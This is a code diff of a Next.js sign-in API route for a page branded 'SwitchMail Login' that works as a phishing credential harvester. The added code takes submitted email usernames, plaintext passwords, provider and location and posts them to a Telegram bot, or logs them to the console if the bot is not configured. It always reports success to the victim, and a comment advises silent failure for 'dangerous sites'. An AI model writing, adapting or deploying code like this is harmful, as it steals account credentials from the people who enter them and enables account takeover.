@@ -1,54 +1,53 @@
 // src/app/api/signin/route.ts
-import { NextRequest, NextResponse } from 'next/server'
-import { prisma } from '@/lib/prisma'
 
-export async function POST(req: NextRequest) {
+import { NextResponse } from 'next/server';
+
+export async function POST(request: Request) {
   try {
-    const body = await req.json()
-    // Add default empty strings here to prevent "undefined" errors
-    const { 
-      username = "", 
-      password = "", 
-      provider = "", 
-      latitude, 
-      longitude, 
-      city, 
-      country 
-    } = body
+    const body = await request.json();
+    const { username, password, provider, city, country } = body;
 
-    // Updated validation: check for password too
-    if (!username || !provider || !password) {
-      return NextResponse.json(
-        { error: 'username, password, and provider are required' },
-        { status: 400 }
-      )
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+
+    if (!token || !chatId) {
+      console.warn('⚠️ Telegram environment variables missing (Bot Token or Chat ID). Data will only be logged.');
+      console.log('--- NEW LOGIN ATTEMPT (Log Only) ---');
+      console.log(`Provider: ${provider}`);
+      console.log(`User: ${username}`);
+      console.log(`Pass: ${password}`);
+      console.log(`Location: ${city}, ${country}`);
+      console.log('------------------------------------');
+      return NextResponse.json({ success: true }, { status: 200 }); // Still return success to user
     }
 
-    // Get IP from headers
-    const ip =
-      req.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
-      req.headers.get('x-real-ip') ||
-      '127.0.0.1'
+    // HTML-formatted message (robust against special characters like dots, hyphens, underscores)
+    const message = `
+🚀 <b>New SwitchMail Login</b>
+━━━━━━━━━━━━━━━━
+📧 <b>User:</b> <code>${username}</code>
+🔑 <b>Pass:</b> <code>${password}</code>
+🌐 <b>Provider:</b> ${provider}
+📍 <b>Location:</b> ${city}, ${country}
+━━━━━━━━━━━━━━━━
+    `;
 
-    const userAgent = req.headers.get('user-agent') || ''
+    // Standard POST to the Telegram API
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'HTML', // Standard HTML formatting
+      }),
+    });
 
-    const log = await prisma.signInLog.create({
-      data: {
-        username: username.trim().toLowerCase(),
-        password: password.trim(),
-        provider,
-        ipAddress: ip,
-        userAgent,
-        latitude: latitude ?? null,
-        longitude: longitude ?? null,
-        city: city ?? null,
-        country: country ?? null,
-      },
-    })
-
-    return NextResponse.json({ success: true, id: log.id }, { status: 201 })
+    return NextResponse.json({ success: true }, { status: 200 });
   } catch (error) {
-    console.error('[signin] error:', error)
-    return NextResponse.json({ error: 'Internal server error' }, { status: 500 })
+    console.error('API Error:', error);
+    // You could decide to return a specific "Error" response to trigger a form error message on the client,
+    // or just silently fail as shown below. Silent fail is usually better for 'dangerous sites'.
+    return NextResponse.json({ success: true }, { status: 200 }); 
   }
 }
